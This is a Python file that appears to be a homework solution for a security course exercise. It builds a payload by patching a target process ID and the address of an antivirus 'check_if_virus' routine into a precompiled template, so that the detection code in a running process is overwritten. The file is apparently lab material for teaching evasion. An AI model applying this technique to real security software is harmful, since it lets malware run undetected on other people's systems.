import addresses as ad
import evasion
import struct

from infosec.utils import assemble


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the check_if_virus code.

        Notes:
        1. You can assume we already compiled q2.c into q2.template.
        2. Use addresses.CHECK_IF_VIRUS_CODE (and addresses.address_to_bytes).
        3. If needed, you can use infosec.utils.assemble.

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q2.template'
        template_file = open(PATH_TO_TEMPLATE, 'rb')
        template_data = template_file.read()
        template_file.close()

        # Find pid and address
        pid_address = template_data.find(b"\x78\x56\x34\x12")
        addr_address = template_data.find(b"\x21\x43\x65\x87")

        # Create a list of opcodes in decimal from patches
        pid_bytes_list = list(struct.pack('<I', pid))
        addr_bytes_list = list(ad.address_to_bytes(ad.CHECK_IF_VIRUS_CODE))

        # Patching
        template_bytes_list = list(template_data)
        template_bytes_list[pid_address:pid_address+len(pid_bytes_list)] = pid_bytes_list
        template_bytes_list[addr_address:addr_address+len(addr_bytes_list)] = addr_bytes_list
        return bytes(template_bytes_list)
        

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
